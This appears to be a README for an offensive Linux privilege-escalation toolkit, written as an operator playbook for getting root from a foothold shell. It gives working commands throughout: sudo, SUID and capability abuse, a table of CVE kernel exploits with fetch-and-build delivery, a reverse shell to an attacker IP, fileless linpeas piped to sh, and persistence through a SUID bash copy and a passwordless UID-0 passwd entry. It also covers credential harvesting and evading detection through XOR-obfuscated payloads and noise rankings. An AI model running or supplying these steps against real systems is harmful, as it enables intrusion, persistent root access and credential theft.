# Linux privesc toolkit — the Potato-toolkit analog

**Foothold shell on a Linux target · attacker 10.0.0.10 · goal: root.** Two buckets, mirroring the two Windows Potato archetypes.

```
Windows                         Linux
─────────────────────────────   ─────────────────────────────────────────────
SeImpersonate → Potato          you hold a privilege/misconfig  → BUCKET 1 (gtfo.py)
GodPotato / PrintSpoofer        drop-and-run a CVE exploit      → BUCKET 2 (gen_exploit.py)
```

## How these scripts work (read this first)
- **The `gen_*.py` / `gtfo.py` scripts run on YOUR attacker box and only PRINT text.** They execute nothing.
- **The output is shell commands you COPY and PASTE into your foothold shell on the target.**
- Flow every time: *run generator on attacker → read the printed block → paste it into the target shell.*
- **One-time config:** edit `LHOST` / `LPORT` / `WEBHOST` / `STAGE` / `REVTYPE` at the top of **`_linpriv_common.py`** — every script reads it. Never hand-edit the printed blobs.
- **Hardened-target knobs** (per-invocation overrides on the generators):
  - `--stagedir <dir>` — where dropped files land. **`/tmp` mounted `noexec` breaks `.so`/`.ko`/compiled PoCs** — pass `--stagedir /var/tmp` (or `$HOME`, `/dev/shm` if exec). `enum.sh` warns if `/tmp` is noexec.
  - `--revtype bash|mkfifo|python|perl|nc` — reverse-shell flavor. Default `bash` needs `/dev/tcp`; a **dash/busybox** target needs `python`/`perl`/`mkfifo`/`nc`. `enum.sh` flags a missing bash.
- **You supply the PoC files** (air-gapped, like you supply `GodPotato.exe`). Grab each from its source (see the BUCKET 2 table: `pwnkit`→github.com/berdav/CVE-2021-4034, `nftables`→github.com/Notselwyn/CVE-2024-1086, `dirtypipe`→Blasty `dirtypipez.c`, etc.), and drop it in the dir you serve.

## STEP 0 — enumerate first (on the target shell)
```bash
sh enum.sh                 # the triage battery (read-only, safe). Or paste it line-by-line in a limited channel.
# runs: sudo -l · SUID (find -perm -4000) · getcap · groups(docker/lxd) · kernel/sudo/pkexec/glibc/userns versions
#       + a NETWORK/ROUTING section (interfaces, routing table, default gateway, ARP) and a machine
#         NET-IFACE/NET-ROUTE/NET-NEIGH/NET-PEER block — feed it to `recce ingest` to map reachability + pivots
```
**Check BUCKET 1 before BUCKET 2** — a SUID/sudo/cap win is instant and can't panic the box; a wrong kernel exploit can.
**But check EVERYTHING, not just the first win.** A box usually has several privesc paths; `enum.sh` now prints a **FINDINGS SUMMARY** tallying every applicable vector. Exploit the safest first, but for an assessment **document them all** (each is a finding). After you're root, re-run — some vectors are only visible with elevated rights.

## Get a PROPER shell first (interactive escapes need a PTY)
Many BUCKET-1 escapes (`vim`/`less`/`nano`/`man`/`ed`/`ftp` pager tricks, `sudoedit`, `!/bin/sh`) **need a TTY** — they fail on a raw reverse shell or a blind exec channel. Upgrade before you try them:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'    # then: Ctrl-Z; stty raw -echo; fg; export TERM=xterm
# no python?  script -qc /bin/bash /dev/null   |   or a socat PTY:  socat file:`tty`,raw,echo=0 tcp:<LHOST>:<LPORT>
```
Non-interactive wins (SUID `-p`, `find -exec`, `awk`/`python` `system()`, capabilities, the CVE PoCs) work fine without a PTY. Pick `--revtype python` for a revshell that's already closer to interactive.

## BUCKET 1 — token / misconfig abuse (no delivery needed)
Binaries already on the box; you just need the right incantation. `gtfo.py` is the lookup (run on attacker, paste the result on target):
```bash
python3 gtfo.py                    # whole table (suid + sudo forms + capabilities)
python3 gtfo.py find               # both forms for one binary
python3 gtfo.py python sudo        # just the sudo form
python3 gtfo.py --scan "$(sudo -l 2>/dev/null)"    # feed it your enum output -> abuse primitives
```
- **suid** form keeps `-p` (don't drop euid); **sudo** form already runs as root.
- Owner of a SUID binary is usually root → the shell you get is root.
- `docker`/`lxd` group = trivially root (`docker run -v /:/mnt … chroot /mnt sh`).
- `getcap` hits = the truest token analog — **12 dangerous caps** with one-liners (`gtfo.py --caps`), incl. cap_sys_admin/cap_sys_module/cap_dac_read_search.
- The inline table is **thorough (~57 binaries)** precisely because an **air-gapped operator can't reach abuse.gtfobins.github.io** — the shells, interpreters, editors/pagers, archivers, gdb, file-rw primitives, net/transfer, and the exec-wrapper family (nice/timeout/flock/…) are all built in. Misses still print the website path as a fallback.

## BUCKET 1.5 — sudo misconfigurations (config abuse, mostly no compile)
`sudo -l` shows what you may run and which env vars survive. Three common wins:
```bash
# (a) env_keep+=LD_PRELOAD / LD_LIBRARY_PATH, or a writable /etc/ld.so.preload → a .so constructor runs as root
python3 gen_preload.py --mode ldpreload   --action revshell --sudocmd /usr/bin/id   # env_keep+=LD_PRELOAD
python3 gen_preload.py --mode ldlib       --lib crypt --sudocmd apache2ctl           # env_keep+=LD_LIBRARY_PATH (name .so after a real dep)
python3 gen_preload.py --mode globalpreload                                          # writable /etc/ld.so.preload -> ANY SUID fires it as root
#   target:  gcc -shared -fPIC -o /tmp/pre.so pre.c ; sudo LD_PRELOAD=/tmp/pre.so /usr/bin/id   → root

# (b) sudoedit / 'sudo -e' rule AND sudo <= 1.9.12p1  → CVE-2023-22809 (no compile):
EDITOR='vi -- /etc/passwd' sudoedit /the/allowed/file    # opens /etc/passwd as root → add a UID-0 line

# (c) an allowed GTFOBins binary → spawn a shell (see gtfo.py 'sudo' form):
sudo awk 'BEGIN{system("/bin/sh")}'                       # or find/vim/less/tar/env/... whatever sudo -l allows
```
- **gen_preload.py** builds the `.so` (embedded action XOR-obfuscated); works with any allowed sudo command — the loader runs the constructor as root *before* that command does anything.
- **Capabilities** (`getcap -r / 2>/dev/null`) are the truest token analog — `cap_setuid`→instant root, `cap_dac_read_search`→read `/etc/shadow`, `cap_dac_override`/`cap_chown`→edit `/etc/passwd`, `cap_sys_module`→load a `.ko` (ring-0). `python3 gtfo.py --caps` / the CAP_ABUSE table lists the one-liners.

## BUCKET 2 — drop-and-run CVE exploits (the GodPotato analog)
```bash
python3 gen_exploit.py list                          # the exploit table + applicability
python3 gen_exploit.py <exploit> --fetch             # target wgets/curls the PoC SOURCE from WEBHOST, builds on-target
python3 gen_exploit.py <exploit> --b64 /path/src.c   # NO network: base64 the source through the exec channel
python3 gen_exploit.py <exploit> --prebuilt --fetch  # ship a PRE-COMPILED binary (target has NO gcc)
python3 gen_exploit.py <exploit> --prebuilt --b64 /path/binary
# add: --action revshell|suid_bash|add_root   (default revshell; only affects the pure-shell 'cmd' exploit)
```

| exploit | CVE | applies | gcc? |
|---|---|---|---|
| **gameoverlay** | CVE-2023-2640/32629 | Ubuntu overlayfs ~5.4–5.17 | **no** (pure shell — truest "Linux Potato") |
| **pwnkit** | CVE-2021-4034 | polkit pkexec <0.120 (near-universal 2021) | yes |
| **dirtypipe** | CVE-2022-0847 | kernel 5.8–5.16.11 | yes |
| **baronsamedit** | CVE-2021-3156 | sudo 1.8.2–1.9.5p1 | yes (offset-finicky) |
| **looneytunables** | CVE-2023-4911 | glibc 2.34+ (Ubuntu 22.04/23.04) | yes |
| **dirtycow** | CVE-2016-5195 | kernel <4.8 (legacy) | yes (can be unstable) |
| **nftables** | CVE-2024-1086 | kernel 5.14–6.6 nf_tables UAF · needs unpriv userns | yes (**best modern all-rounder**, ~99%) |
| **netfilter** | CVE-2023-32233 | kernel ≤6.3.1 nf_tables anon-set UAF · needs unpriv userns | yes (build needs libmnl/libnftnl) |
| **msqueue** | CVE-2021-22555 | kernel 2.6.19–5.11 netfilter x_tables (**widest range**, ~15y) | yes (reliable theflow PoC) |
| **sequoia** | CVE-2021-33909 | kernel <5.13.4 seq_file underflow · Ubuntu/Debian/Fedora | yes (RAM-hungry; snapshot) |
| **stackrot** | CVE-2023-3269 | kernel 6.1–6.4 maple-tree UAF (fills the 6.1–6.4 gap) | yes (timing-sensitive; retry) |

**VERSION-MATCH before firing.** `uname -r`, `/etc/os-release`, `sudo --version`, `pkexec --version`, `ldd --version` — a wrong kernel exploit panics the box.
**nf_tables CVEs need unprivileged user namespaces** — `sysctl kernel.unprivileged_userns_clone` / `cat /proc/sys/user/max_user_namespaces`; `0`/disabled = they won't fire.

### Delivery options (what the generator emits)
- **`--fetch`** — target pulls from your `http.server`. Egress open.
- **`--b64`** — no network; the file rides the exec channel as base64 (`echo … | base64 -d`).
- **`--prebuilt`** — the staged file IS a compiled binary; **skips the on-target build** (for boxes with no gcc). Compile static on the attacker first: `gcc -static <name>.c -o <name>`, then `--prebuilt --fetch` or `--prebuilt --b64 <binary>`.

### After it fires
- **`kind=shell`** (pwnkit/dirtypipe/baron/looney/dirtycow/nftables/netfilter) → interactive **root shell**. From it, run a hold: `suid_bash`, revshell, or `add_root` (the generator prints all three).
- **`kind=cmd`** (gameoverlay) → runs your `--action` **as root** directly (revshell base64-folded, no quoting hell). Have `nc -lvnp 443` ready.

## FULL WORKED EXAMPLE (pwnkit, egress open)
```bash
# --- on the ATTACKER (10.0.0.10) ---
git clone https://github.com/berdav/CVE-2021-4034 && cp CVE-2021-4034/cve-2021-4034.c ./pwnkit.c
python3 -m http.server 80              # terminal 1 — serve pwnkit.c (port 80 MUST match WEBHOST)
nc -lvnp 443                           # terminal 2 — catch a shell if you choose revshell
python3 gen_exploit.py pwnkit --fetch  # terminal 3 — PRINTS the command block

# --- copy that printed block, PASTE it into your TARGET foothold shell ---
# it runs: mkdir /tmp/.e ; wget http://10.0.0.10/pwnkit.c ; make -C /tmp/.e ; /tmp/.e/cve-2021-4034
# -> you land in an interactive root shell. Confirm + establish a hold:
id                                     # uid=0(root)
cp /bin/bash /tmp/.rb; chmod 4755 /tmp/.rb    # persistent root: /tmp/.rb -p  anytime
```
No-gcc target? swap the middle step: `gcc -static pwnkit.c -o pwnkit` on the attacker, then
`python3 gen_exploit.py pwnkit --prebuilt --fetch` (serves the `pwnkit` binary, no build on target).

## Recon helpers (Bucket-2-adjacent — they FIND the vector, staged the same way)
```bash
python3 gen_recon.py list
python3 gen_recon.py linpeas --fetch        # fileless: wget -qO- …/linpeas.sh | sh   (nothing on disk)
python3 gen_recon.py pspy    --fetch        # binary -> disk, chmod, run (watch cron/procs as unpriv)
python3 gen_recon.py <tool>  --b64 /path    # no-network base64 delivery
```
- **linpeas** = the exhaustive sweep (winPEAS analog); use when `enum.sh` doesn't hand you the win. Serve `linpeas.sh` from your http.server dir.
- **pspy** = no-root process/cron watcher — catches root-run cron jobs + creds on the cmdline. Let it run a minute or two. Serve the `pspy64` binary.

## BUCKET 1.6 — misconfig actioning (what enum.sh only DETECTS)
`enum.sh` flags writable cron scripts, NFS exports, and odd sudo/SUID PATH use — `gen_misc.py` turns each into the exploit:
```bash
python3 gen_misc.py cron       --action revshell --path /opt/backup.sh   # append payload to a root-run writable script
python3 gen_misc.py wildcard   --action revshell --tool tar --dir /opt   # root runs `tar/chown/rsync *` -> arg-injection via filenames
python3 gen_misc.py pathhijack --action revshell --cmd service          # root runs a cmd by RELATIVE name -> plant it in PATH
python3 gen_misc.py nfs        --export /srv/share                       # no_root_squash -> make a SUID-root binary (attacker-root)
python3 gen_misc.py kmod       --action add_root                         # cap_sys_module -> build+insmod a ring-0 .ko (needs headers)
python3 gen_misc.py motd       --action revshell                        # writable /etc/update-motd.d/ -> runs as ROOT on next SSH login
python3 gen_misc.py sudoersd                                            # writable /etc/sudoers.d/ -> drop a NOPASSWD rule
python3 gen_misc.py pythonpath --action revshell --module <imported>    # root python imports a module you can plant (or env_keep PYTHONPATH)
python3 gen_misc.py systemd    --action revshell --unit foo.service     # writable .service/.timer -> ExecStart as root
```
- **cron** = the most common one: a root cron job runs a script you can write → append your action.
- **kmod** emits `rootmod.c`+`Makefile`; `make` needs the TARGET kernel's headers (build on a matching kernel + ship the `.ko` if absent).

## Loot / credential harvest (the other half of the funnel)
A reused password or an SSH key is often the real path — `gen_loot.py` is the thorough sweep (coreutils only, read-only):
```bash
python3 gen_loot.py                    # full sweep: ssh keys · history · config creds · backups · readable shadow
python3 gen_loot.py --mode config      # just the app/config/.env/cloud-cred grep   (or: keys|history|backups|shadow)
```
Crack a found hash on the ATTACKER (you'll have john/hashcat): `unshadow`+`john`, or `hashcat -m 1800` for `$6$` sha512crypt. **Try password reuse first — it's free** (`su`/`ssh` to the other user, then `sudo -l`).

## Root-hold snippets (paste once you're root)
```bash
cp /bin/bash /tmp/.rb; chmod 4755 /tmp/.rb          # SUID bash -> /tmp/.rb -p  anytime
bash -c 'bash -i >& /dev/tcp/10.0.0.10/443 0>&1'    # revshell (needs nc -lvnp 443 waiting)
echo 'r::0:0:r:/root:/bin/bash' >> /etc/passwd      # UID-0 user 'r' (no pw) -> su r
```

## AV / EDR reality (avoiding quarantine + alerts)
**Ceiling, honestly:** the `.so`/`.ko` embed a *random-per-build XOR key* so the plaintext command isn't sitting in the file for a static scanner — but Linux endpoint tooling (**auditd / Falco / EDR**) logs the *behavior* (execve, module load, ptrace). This reduces static-scan hits; it is **not** EDR-proof.

**Choose the quiet path:**
- **BUCKET 1 is the quietest by far** — abusing an existing SUID/sudo/cap binary drops **nothing** and runs a native tool (no payload, no delivery, no compile). Exhaust it before BUCKET 2.
- **BUCKET 2 is loud** — a dropped PoC binary + its execve + `dmesg`/kernel logs (and a module load for `kmod` is audited). Prefer it last, and **recompile the ⚠ PoCs** (fresh hash — see `SUPPLIED-BINARIES.md`).
- Fileless where possible: `gen_recon.py linpeas --fetch` pipes to `sh` (nothing on disk); the loot sweep is read-only.

**Detection profile — pick by noise:**
| Technique | Detection risk | Note |
|---|---|---|
| GTFOBins SUID/sudo, capabilities, group abuse | **quiet** | native binaries, no artifact |
| loot / cred read (`gen_loot`) | **quiet** | read-only |
| writable cron/motd/systemd/wildcard | low–med | leaves a file/edit → logged; revert it |
| LD_PRELOAD / ld.so.preload | med | env/loader change is auditable |
| CVE PoC (BUCKET 2) | **HIGH** | dropped binary + kernel logs; may crash |
| kernel module (`kmod`) | **HIGH** | module load is audited |

**Test before you burn:** confirm a version-match (`uname -r`) before dropping a PoC — a wrong one is both a crash risk and a wasted, logged artifact.

## Honesty notes
- **Bucket 1 > Bucket 2 always.** SUID/sudo/caps can't crash the box; kernel exploits can. Exhaust bucket 1 first.
- **You supply the PoCs** — the generator assumes source named `<name>.c` (or, with `--prebuilt`, a binary named `<name>`). Grab each from its GitHub/exploit-db source and name it to match; verify its real build step matches the table's (Makefile vs single `gcc`).
- **dirtycow/baronsamedit can destabilize** — snapshot first if you can; baron needs target-matched offsets (try the numbered targets).
- `/dev/tcp` revshell needs a real bash target; if it's dash-only, use `mkfifo`/`nc`/python revshell instead.
- These are memory-corruption/logic CVEs, not evasion — Linux EDR (auditd/Falco) logs the behavior. Fine for HTB/lab.

Files: `_linpriv_common.py` (config + EXPLOITS + RECON + GTFOBINS + CAP_ABUSE + SUDO_TRICKS + root actions) ·
`gen_exploit.py` (bucket 2) · `gen_preload.py` (LD_PRELOAD .so, bucket 1.5) · `gen_misc.py` (cron/pathhijack/nfs/kmod, bucket 1.6) ·
`gen_loot.py` (cred/loot harvest) · `gen_recon.py` (linpeas/pspy) · `gtfo.py` (bucket 1 · `--caps` · `--sudo-tricks` · `--scan`) ·
`enum.sh` (triage battery).

---
Platform analog: this mirrors LlamaExpress `ctf/privesc` + `ctf/core.privesc_attempt` (enum→rank→run-through) —
the Linux equivalent of `ad/winprivesc` + the POTATOES run-through. New vector = a playbook + (maybe) an
`_exploits/` PoC in the substrate, never a killchain edit.
